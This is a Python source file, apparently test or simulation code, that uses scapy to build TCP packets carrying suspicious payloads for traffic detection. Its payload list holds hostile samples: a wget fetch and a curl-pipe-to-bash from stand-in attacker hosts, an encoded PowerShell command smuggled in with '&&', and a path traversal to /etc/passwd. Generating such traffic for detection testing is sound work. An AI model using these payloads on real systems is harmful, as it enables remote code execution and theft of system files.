from __future__ import annotations
from typing import List
from scapy.packet import Packet
# local imports
from backend.traffic.common import tcp_packet


def build_suspicious_payload_traffic(attacker_ip: str = "192.168.1.203", target_ip: str = "192.168.1.70") -> List[Packet]:
    """Generate suspicious plaintext payload patterns."""
    payloads = [
        b"username=admin; wget http://evil.example/payload.sh",
        b"id=7&&powershell -enc SQBFAFgA",
        b"cmd=$(curl http://bad.site/p.sh | bash)",
        b"file=../../../../etc/passwd",
    ]
    packets: List[Packet] = []
    for idx, payload in enumerate(payloads):
        # P (PSH) used to ask receiver to push the data to the application immediately
        # A (ACK) used to fake this is already established connection (you 'acknowlege' previous data)
        packets.append(tcp_packet(attacker_ip, target_ip, 61000 + idx, 8080, flags="PA", payload=payload))
    return packets

